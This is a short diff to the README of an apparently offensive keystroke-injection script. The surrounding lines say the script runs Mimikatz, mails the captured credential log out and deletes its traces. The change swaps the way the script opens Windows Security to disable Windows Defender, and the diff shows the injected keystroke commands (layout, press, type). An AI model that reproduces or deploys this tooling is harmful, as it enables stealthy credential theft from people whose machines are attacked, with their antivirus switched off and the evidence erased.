@@ -7,7 +7,7 @@ Then it send to your mail the log as attachment, delete Mimikatz and log files a
 
 ## Requirement
 
-1. First note this script has been created and tested under Windows 11 Build 22000 and that i give the full path of "Windows Security" to disable Windows Defender. You may need to change the path according to you.
+1. First note this script has been created and tested under Windows 11 Build 22000.
 
 2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.
 
@@ -21,7 +21,7 @@ Then it send to your mail the log as attachment, delete Mimikatz and log files a
 layout("ch")
 press("GUI r")
 delay(1000)
-type("C:/Program Files/WindowsApps/Microsoft.SecHealthUI_1000.22000.1.0_neutral__8wekyb3d8bbwe/SecHealthUI.exe")
+type("windowsdefender:")
 press("ENTER")
 delay(1000)
 press("ENTER")
